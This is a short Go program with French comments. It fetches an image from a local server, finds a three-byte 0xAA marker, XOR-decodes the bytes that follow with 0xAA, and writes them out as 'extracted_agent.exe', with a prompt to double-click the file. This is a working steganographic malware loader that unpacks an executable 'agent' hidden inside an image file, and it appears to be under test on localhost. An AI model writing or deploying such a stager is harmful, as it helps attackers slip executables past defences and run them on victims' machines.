package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
)

func main() {
	// Télécharger l'image
	resp, err := http.Get("http://127.0.0.1:8080/img.jpg")
	if err != nil {
		fmt.Println("Erreur HTTP:", err)
		return
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Erreur lecture:", err)
		return
	}

	fmt.Printf("Téléchargé %d bytes\n", len(data))

	// Chercher le marqueur
	offset := -1
	for i := 0; i < len(data)-3; i++ {
		if data[i] == 0xAA && data[i+1] == 0xAA && data[i+2] == 0xAA {
			offset = i + 3
			fmt.Printf("Marqueur trouvé à l'offset %d\n", i)
			break
		}
	}

	if offset == -1 {
		fmt.Println("Marqueur NON trouvé")
		return
	}

	// Extraire l'agent
	encrypted := data[offset:]
	fmt.Printf("Agent extrait: %d bytes\n", len(encrypted))

	// Déchiffrer
	for i := 0; i < len(encrypted); i++ {
		encrypted[i] ^= 0xAA
	}

	// Sauvegarder pour tester
	err = os.WriteFile("extracted_agent.exe", encrypted, 0755)
	if err != nil {
		fmt.Println("Erreur sauvegarde:", err)
		return
	}
	fmt.Println("✅ Agent sauvegardé dans extracted_agent.exe")
	fmt.Println("Double-clique sur extracted_agent.exe pour tester")
}